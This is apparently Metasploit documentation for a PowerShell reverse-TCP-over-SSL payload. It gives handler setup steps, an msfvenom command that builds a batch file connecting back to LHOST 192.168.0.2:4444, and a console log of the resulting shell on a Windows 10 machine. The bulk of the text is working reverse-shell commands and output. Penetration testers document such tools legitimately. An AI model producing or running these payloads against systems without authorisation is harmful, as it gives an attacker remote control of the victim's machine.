## Vulnerable Application

This powershell payload is suitable for the following environments:

* Windows 2012
* Windows 10

Older versions of Windows (e.g Windows 7) may have issues establishing the SSL connection.
For these versions using the non-SSL payload (cmd/windows/powershell_reverse_tcp) is recommended.

## Verification Steps

1. Do: `use exploit/multi/handler`
2. Do: `set payload cmd/windows/powershell_reverse_tcp_ssl`
2. Do: `set LHOST [IP]`
3. Do: `set LPORT [PORT]`
4. Do: `run`

## Scenarios

### Generating a batch file with msfvenom

```
msfvenom -p cmd/windows/powershell_reverse_tcp_ssl LHOST=192.168.0.2 LPORT=4444 -o powershell_reverse_tcp_ssl.bat
```

The output batch file can be executed directly on the target, or pasted as a command.

### Example usage on Windows 10 target

```
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload cmd/windows/powershell_reverse_tcp_ssl
payload => cmd/windows/powershell_reverse_tcp_ssl
msf6 exploit(multi/handler) > set LHOST 192.168.0.2
LHOST => 192.168.0.2
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > run
[*] Started reverse SSL handler on 192.168.0.2:4444
[*] Powershell session session 1 opened (192.168.0.2:4444 -> 192.168.0.2:49736 ) at 2021-11-02 13:01:28 +0000

msf6 exploit(multi/handler) > sessions 1
[*] Starting interaction with 1...

User @ DESKTOP-5E3GRS6
PS C:\Users\User> exit
[*] 192.168.0.2 - Powershell session session 1 closed.
```

## Options

### LOAD_MODULES

A list of powershell modules (separated by a commas) to download.

